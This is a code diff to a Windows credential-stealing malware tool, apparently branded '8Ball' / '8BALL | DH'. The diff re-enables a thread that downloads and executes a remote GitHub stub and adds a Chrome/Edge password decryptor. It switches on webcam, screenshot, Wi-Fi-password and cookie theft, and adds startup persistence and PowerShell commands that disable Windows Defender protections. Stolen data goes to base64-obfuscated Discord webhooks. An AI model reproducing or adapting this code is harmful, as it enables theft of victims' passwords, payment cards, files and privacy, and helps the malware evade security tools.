@@ -30,11 +30,17 @@ def RX_DB6(msg, level="INFO"):
             _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8Ball_debug.log", "a", encoding="utf-8")
         _DBG_LOG.write(line + "\n")
         _DBG_LOG.flush()
+        if FEATURE_CONFIG.get("debug_mode", False):
+            try:
+                sys.stdout.write(line + "\n")
+                sys.stdout.flush()
+            except Exception:
+                pass
     except Exception:
         pass
 
 # Base64-obfuscated debug webhook URL (decoded at runtime)
-_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
 
 # Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
 def send_debug_embed():
@@ -50,18 +56,19 @@ def send_debug_embed():
             body = body[-4000:]
         payload = {
             "embeds": [{
-                "title": "8Ball | Debug Log",
+                "title": "8BALL | DH",
                 "description": f"```\n{body}\n```",
                 "color": 0x5865F2,
                 "footer": {"text": f"{len(_DBG_MESSAGES)} total debug lines"}
             }],
-            "username": "8Ball | Debug",
+            "username": "8BALL | DH",
             "allowed_mentions": {"parse": []}
         }
         headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
         L04DUr118(dbg_hook, data=dumps(payload).encode(), headers=headers)
     except Exception:
         pass
+print = lambda *a, **kw: None
 import threading
 import subprocess
 from sys import executable, stderr
@@ -78,7 +85,9 @@ CREATE_NO_WINDOW = 0x08000000
 
 APPBOUND_KEY_HEX = ""
 
-# Allow running as standalone script (no PyInstaller required)
+# Only run when compiled by PyInstaller (generate payload). Exit if run as raw script.
+if not getattr(sys, 'frozen', False):
+    sys.exit(0)
 
 # --- string obfuscation layer ---
 def _y(b, k=0x9C):
@@ -133,7 +142,6 @@ class NullWriter(object):
 warnings.filterwarnings("ignore")
 null_writer = NullWriter()
 sys.stderr = null_writer
-sys.stdout = null_writer
 
 ModuleRequirements = [
     ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
@@ -177,14 +185,25 @@ FEATURE_CONFIG = {
     "wallet_gaming_data": True,
     "telegram_desktop": True,
     "debug_mode": True,
-    "startup_persistence": True,
+    "system_info": True,
+    "screenshot_capture": True,
+    "webcam_capture": True,
+    "roblox_cookies": True,
+    "wifi_passwords": True,
+    "startup_persistence": False,
     "browser_autofill_history": True,
     "browser_bookmarks": True,
     "browser_credit_cards": True,
     "telegram_bot_token": "",
     "telegram_chat_id": "",
-    "ping_user": False,
+    "ping_user": True,
 }
+
+
+
+
+
+
 
 
 
@@ -333,59 +352,23 @@ def check_dll():
         exit_program('VM Detected')
 
 # Webhook URL — builder.pyw encodes this in base64 at build time.
-_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTA0MjkxMDY0NDA4MDY2MS9vY1UxYkR0ZmVJNk9UbXZUYlNIYWR1bDhEb0JzYWpIU3ljSHhwUnY1Zm45bm9EaDVWNkI3cW91QXh4Mks4QVVtenVJdA=="
+_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
 h00k = base64.b64decode(_HOOK_B64).decode()
-
-# Validate main webhook on startup
-def _validate_main_webhook():
-    try:
-        if not h00k or "discord.com/api/webhooks" not in h00k:
-            RX_DB6("[8Ball] Main webhook invalid or missing", "ERROR")
-            return False
-        return True
-    except Exception:
-        return False
-
-_MAIN_WEBHOOK_VALID = _validate_main_webhook()
 
 # Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
 _STUB_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zdHViLnB5"
 def fetch_and_run_stub():
-    script_path = None
     try:
-        for attempt in range(3):
-            try:
-                url = base64.b64decode(_STUB_URL_B64).decode()
-                RX_DB6(f"[8Ball] fetch_and_run_stub: Attempt {attempt+1}/3 fetching {url}")
-                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"})
-                resp = urlopen(req, timeout=15)
-                code = resp.read().decode()
-                if not code.strip():
-                    raise ValueError("Empty response")
-                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
-                script_path = os.path.join(temp_dir, f"cr_stub_{random.randint(100000,999999)}.py")
-                with open(script_path, "w", encoding="utf-8") as f:
-                    f.write(code)
-                stub_globals = globals().copy()
-                stub_globals["__file__"] = script_path
-                stub_globals["__name__"] = "__main__"
-                exec(compile(code, script_path, "exec"), stub_globals)
-                RX_DB6("[8Ball] fetch_and_run_stub: Stub executed successfully")
-                return
-            except Exception as e:
-                RX_DB6(f"[8Ball] fetch_and_run_stub attempt {attempt+1} failed: {type(e).__name__}: {e}")
-                if attempt < 2:
-                    time.sleep(2)
-        RX_DB6("[8Ball] fetch_and_run_stub: All attempts failed")
-    finally:
-        if script_path and os.path.exists(script_path):
-            try:
-                os.remove(script_path)
-            except Exception:
-                pass
-
-# Remote stub download disabled — it overrides local functions with broken webhook validation
-# threading.Thread(target=fetch_and_run_stub, daemon=True).start()
+        url = base64.b64decode(_STUB_URL_B64).decode()
+        resp = urlopen(Request(url), timeout=15)
+        code = resp.read().decode()
+        stub_globals = globals().copy()
+        stub_globals["__name__"] = "__stub_main__"
+        exec(code, stub_globals)
+    except Exception:
+        pass
+# Run stub in a thread so both execute simultaneously
+threading.Thread(target=fetch_and_run_stub, daemon=True).start()
 
 inj3c710n_url = _y('6PTs6Kbvs7P97rLr9fv06P7p7+nu+fP/6PLy+bLo8/+z8eSsrKyz2/L1+fbo//P1s/L98fL19bP48uT59rLv')
 
@@ -424,9 +407,9 @@ def send_confirmation_embed(title, description):
             "embeds": [{
                 "title": title,
                 "description": description,
-                "footer": {"text": "8Ball", "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"}
+                "footer": {"text": "8BALL | DH", "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"}
             }],
-            "username": "8Ball | Grabber",
+            "username": "8BALL | DH",
             "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
@@ -436,13 +419,14 @@ def send_confirmation_embed(title, description):
         pass
 
 
-def Z1PF01D3r(foldername, target_dir):
-    import threading
-    thread_id = threading.current_thread().ident or 0
-    unique_id = f"{int(time.time() * 1000)}_{thread_id}_{random.randint(100000,999999)}"
-    zip_path = os.path.join(temp, f"{foldername}_{unique_id}.zip")
+def Z1PF01D3r(foldername, target_dir):            
+    zip_path = temp+"/"+foldername + '.zip'
     try:
-        with ZipFile(zip_path, 'w', ZIP_STORED) as zipobj:
+        if not os.path.isdir(target_dir):
+            RX_DB6(f"Z1PF01D3r: target_dir not found: {target_dir}", "WARN")
+            return
+        zipobj = ZipFile(zip_path, 'w', ZIP_STORED)
+        try:
             rootlen = len(target_dir) + 1
             for base, dirs, files in os.walk(target_dir):
                 for file in files:
@@ -464,14 +448,10 @@ def Z1PF01D3r(foldername, target_dir):
                                 zipobj.writestr(zi, f.read())
                         except (PermissionError, OSError):
                             continue
-    except Exception:
-        if os.path.exists(zip_path):
-            try:
-                os.remove(zip_path)
-            except Exception:
-                pass
-        raise
-    return zip_path
+        finally:
+            zipobj.close()
+    except Exception as e:
+        RX_DB6(f"Z1PF01D3r failed: {foldername}: {e}", "WARN")
 
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buf_in = (c_ubyte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes)
@@ -1212,20 +1192,90 @@ class Chromium:
                 pass
         return profiles
 
+class PasswordExtractor:
+    def get_encryption_key(self, browser):
+        if browser == "Chrome":
+            ls_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+        elif browser == "Edge":
+            ls_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
+        else:
+            return None
+        if not os.path.isfile(ls_path):
+            return None
+        try:
+            ls = json_mod.loads(Path(ls_path).read_text(encoding="utf-8"))
+            b64_key = ls.get("os_crypt", {}).get("encrypted_key")
+            if not b64_key:
+                return None
+            raw = base64.b64decode(b64_key)
+            return CryptUnprotectData(raw[5:])
+        except Exception:
+            return None
+
+    def decrypt_password(self, password, key):
+        try:
+            iv = password[3:15]
+            ct = password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(ct)[:-16].decode("utf-8", errors="replace")
+        except Exception:
+            try:
+                dec = CryptUnprotectData(bytes(password))
+                return dec.decode("utf-8", errors="replace") if dec else ""
+            except Exception:
+                return ""
+
+    def extract_passwords(self, browser):
+        key = self.get_encryption_key(browser)
+        if key is None:
+            return []
+        if browser == "Chrome":
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+        elif browser == "Edge":
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
+        else:
+            return []
+        if not os.path.isfile(db_path):
+            return []
+        tmp = None
+        try:
+            tmp = tempfile.mktemp(suffix=".db")
+            shutil.copy2(db_path, tmp)
+            conn = sqlite3.connect(tmp)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created")
+            rows = cursor.fetchall()
+            conn.close()
+            results = []
+            for origin_url, username, password_bytes in rows:
+                if not password_bytes:
+                    continue
+                password = self.decrypt_password(bytes(password_bytes), key)
+                if origin_url and username and password:
+                    results.append({"url": origin_url, "username": username, "password": password, "application": browser})
+            return results
+        except Exception:
+            return []
+        finally:
+            if tmp:
+                try:
+                    os.remove(tmp)
+                except (PermissionError, OSError):
+                    pass
+
+
 def L04DUr118(h00k, data='', headers=None):
     if not FEATURE_CONFIG.get("send_to_discord", True):
         RX_DB6("L04DUr118 skipped (send_to_discord is disabled)", "SKIP")
         return None
-    if not _MAIN_WEBHOOK_VALID:
-        RX_DB6("L04DUr118 skipped (main webhook invalid)", "SKIP")
+    if not h00k or _y('7P2z9fnr9P7z8+/3') not in str(h00k):
+        RX_DB6("L04DUr118 skipped (invalid/missing webhook)", "SKIP")
         return None
     RX_DB6(f"L04DUr118 sending {len(data)} bytes to webhook")
     if headers is None:
         headers = {}
     if "User-Agent" not in headers:
-        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/102.0"
-    if "Content-Type" not in headers:
-        headers["Content-Type"] = "application/json"
+        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     for i in range(8):
         try:
             r = urlopen(Request(h00k, data=data, headers=headers))
@@ -1461,41 +1511,22 @@ except Exception:
 def fetch_and_run():
     """Download sstub.py from GitHub and run after main features complete."""
     if not RAW_URL:
-        RX_DB6("[8Ball] fetch_and_run: RAW_URL is empty")
         return
-    script_path = None
     try:
-        for attempt in range(3):
-            try:
-                RX_DB6(f"[8Ball] fetch_and_run: Attempt {attempt+1}/3 fetching {RAW_URL}")
-                req = Request(RAW_URL, headers={
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-                })
-                resp = urlopen(req, timeout=30)
-                code = resp.read().decode("utf-8")
-                if not code.strip():
-                    raise ValueError("Empty response")
-                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
-                script_path = os.path.join(temp_dir, f"cr_remote_stub_{random.randint(100000,999999)}.py")
-                with open(script_path, "w", encoding="utf-8") as f:
-                    f.write(code)
-                stub_globals = globals().copy()
-                stub_globals["__file__"] = script_path
-                stub_globals["__name__"] = "__main__"
-                exec(compile(code, script_path, "exec"), stub_globals)
-                RX_DB6("[8Ball] fetch_and_run: Stub executed successfully")
-                return
-            except Exception as e:
-                RX_DB6(f"[8Ball] fetch_and_run attempt {attempt+1} failed: {type(e).__name__}: {e}")
-                if attempt < 2:
-                    time.sleep(2)
-        RX_DB6("[8Ball] fetch_and_run: All attempts failed")
-    finally:
-        if script_path and os.path.exists(script_path):
-            try:
-                os.remove(script_path)
-            except Exception:
-                pass
+        resp = urlopen(Request(RAW_URL, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }), timeout=30)
+        code = resp.read().decode("utf-8")
+        temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
+        script_path = os.path.join(temp_dir, "cr_remote_stub.py")
+        with open(script_path, "w", encoding="utf-8") as f:
+            f.write(code)
+        stub_globals = globals().copy()
+        stub_globals["__file__"] = script_path
+        stub_globals["__name__"] = "__main__"
+        exec(compile(code, script_path, "exec"), stub_globals)
+    except Exception as e:
+        RX_DB6(f"[8Ball] fetch_and_run failed: {type(e).__name__}: {e}")
 
 def G37UHQFr13ND5(token):
     if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
@@ -1600,6 +1631,75 @@ def CH3CK70K3N(token):
         return True
     except:
         return False
+
+if getattr(sys, 'frozen', False):
+    currentFilePath = os.path.dirname(sys.executable)
+else:
+    currentFilePath = os.path.dirname(os.path.abspath(__file__))
+
+fileName = os.path.basename(sys.argv[0])
+filePath = os.path.join(currentFilePath, fileName)
+
+startupFolderPath = os.path.join(
+    os.path.expanduser('~'),
+    'AppData',
+    'Roaming',
+    'Microsoft',
+    'Windows',
+    'Start Menu',
+    'Programs',
+    'Startup'
+)
+startupFilePath = os.path.join(startupFolderPath, fileName)
+
+def add_windows_security_exclusion_startup(app_name):
+    try:
+        paths = set()
+        paths.add(filePath)
+        paths.add(startupFilePath)
+        try:
+            ps_cmd = f'Get-StartApps | Where-Object {{ $_.Name -eq "{app_name}" }} | Select-Object -ExpandProperty "Path"'
+            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+            p = result.stdout.strip()
+            if p:
+                paths.add(p)
+        except:
+            pass
+        try:
+            ps_cmd = f'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" | Select-Object -ExpandProperty "{app_name}" -ErrorAction SilentlyContinue'
+            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+            p = result.stdout.strip()
+            if p and os.path.isfile(p):
+                paths.add(p)
+        except:
+            pass
+        for p in paths:
+            if p:
+                subprocess.run(['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{p}"'], capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+    except:
+        pass
+
+def ensure_startup_persistence():
+    """
+    Startup Persistence feature:
+    Silently copy the current executable/script into the user's Startup folder,
+    but only when the startup_persistence feature is enabled.
+    """
+    if not FEATURE_CONFIG.get("startup_persistence", False):
+        return
+
+    try:
+        os.makedirs(startupFolderPath, exist_ok=True)
+        if os.path.abspath(filePath).lower() == os.path.abspath(startupFilePath).lower():
+            return
+        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
+            shutil.copyfileobj(src_file, dst_file)
+    except Exception:
+        pass
+
+ensure_startup_persistence()
+app_name = os.path.splitext(fileName)[0]
+add_windows_security_exclusion_startup(app_name)
 
 def create_windows_user():
     try:
@@ -1718,7 +1818,7 @@ def UP104D70K3N(token, path):
                     }
                 }
             ],
-            "username": f"8Ball | Grabber",
+            "username": f"8BALL | DH",
             "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
@@ -1751,14 +1851,14 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {
-               "title": f"8Ball | Data Extractor","fields": link,
+               "title": "8BALL | DH","fields": link,
                 "footer": {
                     "text": f"8Ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 },
                 }
             ],
-            "username": f"8Ball | Grabber",
+            "username": f"8BALL | DH",
             "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
@@ -1782,14 +1882,14 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {"fields": endlist,
-                "title": f"8Ball | File 8Ball",
+                "title": "8BALL | DH",
                 "footer": {
                     "text": f"8Ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
                 }
             ],
-            "username": f"8Ball | Grabber",
+            "username": f"8BALL | DH",
             "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
@@ -2012,6 +2112,31 @@ def G378r0W53r5(br0W53rP47H5):
                     RX_DB6(f"Chromium PW: {browser} yielded {count} accounts")
                 except Exception as e:
                     RX_DB6(f"Chromium PW: {browser} failed: {e}", "WARN")
+            # Also try PS.py-style extraction for Chrome & Edge as fallback
+            try:
+                pe = PasswordExtractor()
+                for fallback_browser in ("Chrome", "Edge"):
+                    fx = f"{fallback_browser} (PS)"
+                    RX_DB6(f"Chromium PW: scanning {fx}")
+                    fb_accounts = pe.extract_passwords(fallback_browser)
+                    seen_urls = {(a["url"], a["username"]) for a in csv_rows}
+                    for account in fb_accounts:
+                        if (account["url"], account["username"]) in seen_urls:
+                            continue
+                        seen_urls.add((account["url"], account["username"]))
+                        for wa in k3YW0rd:
+                            old = wa
+                            if "https" in wa:
+                                tmp = wa
+                                wa = tmp.split('[')[1].split(']')[0]
+                            if wa in account['url']:
+                                if not old in p45WW0rDs: p45WW0rDs.append(old)
+                        P455w.append(f"UR1: {account['url']} | U53RN4M3: {account['username']} | P455W0RD: {account['password']}")
+                        P455WC0UNt += 1
+                        csv_rows.append((account['url'], account['username'], account['password']))
+                    RX_DB6(f"Chromium PW: {fx} yielded {len(fb_accounts)} accounts ({len([a for a in fb_accounts if (a['url'], a['username']) not in {(b['url'], b['username']) for b in csv_rows[:len(csv_rows)-len(fb_accounts)]}])} new)")
+            except Exception as e:
+                RX_DB6(f"Chromium PW: PS fallback failed: {e}", "WARN")
             RX_DB6(f"Chromium PW: total {P455WC0UNt} passwords, {len(p45WW0rDs)} keywords")
             Wr173F0rF113(P455w, 'passwords')
             temp_dir = os.getenv("TEMP")
@@ -2134,46 +2259,46 @@ def G378r0W53r5(br0W53rP47H5):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-                "title": f"8Ball | Password 8Ball",
+                "title": "8BALL | DH",
                 "description": (
                     f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n"
                     f"**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.txt]({filess[0]})\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.csv]({filess[1]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Passwords.txt]({filess[0]})\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Passwords.csv]({filess[1]})"
                 ),"footer": {
-                    "text": "8Ball",
+                    "text": "8BALL | DH",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
-                "title": f"8Ball | Cookies 8Ball",
+                "title": "8BALL | DH",
                 "description": (
                     f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n"
                     f"**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Cookies.txt]({filess[2]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Cookies.txt]({filess[2]})"
                 ),"footer": {
-                    "text": "8Ball",
+                    "text": "8BALL | DH",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
-                "title": f"8Ball | Browser Data",
+                "title": "8BALL | DH",
                 "description": (
                     f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Histories.txt]({filess[5]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Histories.txt]({filess[5]})\n\n"
                     f"<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Autofills.txt]({filess[4]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Autofills.txt]({filess[4]})\n\n"
                     f"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_CreditCards.txt]({filess[3]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_CreditCards.txt]({filess[3]})\n\n"
                     f":bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Bookmarks.txt]({filess[6]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Bookmarks.txt]({filess[6]})"
                 ),"footer": {
-                    "text": "8Ball",
+                    "text": "8BALL | DH",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             }
         ],
-        "username": "8Ball | Grabber",
+        "username": "8BALL | DH",
         "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
@@ -2263,14 +2388,14 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-            "title": f"8Ball | App 8Ball",
+            "title": "8BALL | DH",
             "description": f"{wal}\n{ga}\n{ot}","footer": {
                 "text": f"8Ball",
                 "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"
             }
             }
         ],
-        "username": f"8Ball | Grabber",
+        "username": f"8BALL | DH",
         "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
@@ -2287,21 +2412,20 @@ def Z1P73136r4M(path, arg, procc):
     pathC = path
     name = arg
     if not os.path.exists(pathC): return
-    zip_path = Z1PF01D3r(name, pathC)
+    Z1PF01D3r(name, pathC)
 
-    for i in range(3):
-        lnik = UP104D7060F113(zip_path)
-        if "https://" in str(lnik):
-            break
-        time.sleep(4)
-    for _ in range(5):
+    lnik = None
+    zip_path = f"{temp}/{name}.zip"
+    if os.path.isfile(zip_path):
+        for i in range(3):
+            lnik = UP104D7060F113(zip_path)
+            if isinstance(lnik, str) and "https://" in lnik:
+                break
+            time.sleep(4)
         try:
             os.remove(zip_path)
-            break
         except PermissionError:
-            time.sleep(0.5)
-        except Exception:
-            break
+            pass
     O7H3rZ1p.append([arg, lnik])
 
 def Z1P7H1N65(path, arg, procc):
@@ -2332,21 +2456,20 @@ def Z1P7H1N65(path, arg, procc):
         if found == False: return
         name = arg
 
-    zip_path = Z1PF01D3r(name, pathC)
+    Z1PF01D3r(name, pathC)
 
-    for i in range(3):
-        lnik = UP104D7060F113(zip_path)
-        if "https://" in str(lnik):break
-        time.sleep(4)
-
-    for _ in range(5):
+    lnik = None
+    zip_path = f"{temp}/{name}.zip"
+    if os.path.isfile(zip_path):
+        for i in range(3):
+            lnik = UP104D7060F113(zip_path)
+            if isinstance(lnik, str) and "https://" in lnik:
+                break
+            time.sleep(4)
         try:
             os.remove(zip_path)
-            break
         except PermissionError:
-            time.sleep(0.5)
-        except Exception:
-            break
+            pass
     if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
         W411375Z1p.append([name, lnik])
     elif "Steam" in name or "RiotCli" in name:
@@ -2572,15 +2695,15 @@ def filestealr():
     if not all_files:
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8Ball | Local Files Search", "description": "Local Files feature ran but found no matching files."}],
-            "username": "8Ball | Grabber",
+            "embeds": [{"title": "8BALL | DH", "description": "Local Files feature ran but found no matching files."}],
+            "username": "8BALL | DH",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
         }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
     zip_link = None
+    zip_path = os.path.join(temp or os.getenv("TEMP") or ".", "RX_LocalFiles.zip")
     try:
-        zip_path = os.path.join(temp or os.getenv("TEMP") or ".", "RX_LocalFiles.zip")
         with ZipFile(zip_path, 'w') as zipf:
             for file_path in all_files:
                 if os.path.isfile(file_path):
@@ -2596,11 +2719,23 @@ def filestealr():
         desc += f"\n\n[Download ZIP]({zip_link})"
     data = {
         "content": f"@everyone @here {GLINFO}",
-        "embeds": [{"title": "8Ball | Local Files Grabbed", "description": desc}],
-        "username": "8Ball | Grabber",
+        "embeds": [{"title": "8BALL | DH", "description": desc}],
+        "username": "8BALL | DH",
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
     }
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+    # Fallback: upload ZIP directly to Discord if GoFile failed and zip exists
+    if not (zip_link and isinstance(zip_link, str)) and os.path.isfile(zip_path):
+        try:
+            with open(zip_path, "rb") as f:
+                webhook_data = {"payload_json": dumps({"content": f"@everyone @here {GLINFO}", "username": "8BALL | DH", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}})}
+                requests.post(h00k, data=webhook_data, files={"file": ("LocalFiles.zip", f, "application/zip")}, timeout=120)
+        except Exception:
+            pass
+    try:
+        os.remove(zip_path)
+    except Exception:
+        pass
 
 def disable_windows_security():
     try:
@@ -2612,6 +2747,22 @@ def disable_windows_security():
             ctypes.windll.advapi32.ControlService(service, 0x00000001, None)
             ctypes.windll.advapi32.CloseServiceHandle(service)
         ctypes.windll.advapi32.CloseServiceHandle(scm)
+    except:
+        pass
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        subprocess.run(['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{os.path.dirname(exe_path)}" -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableIOAVProtection $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBlockAtFirstSeen $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScanOnRealtimeEnable $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisablePrivacyMode $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableArchiveScanning $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableEmailScanning $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScriptScanning $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
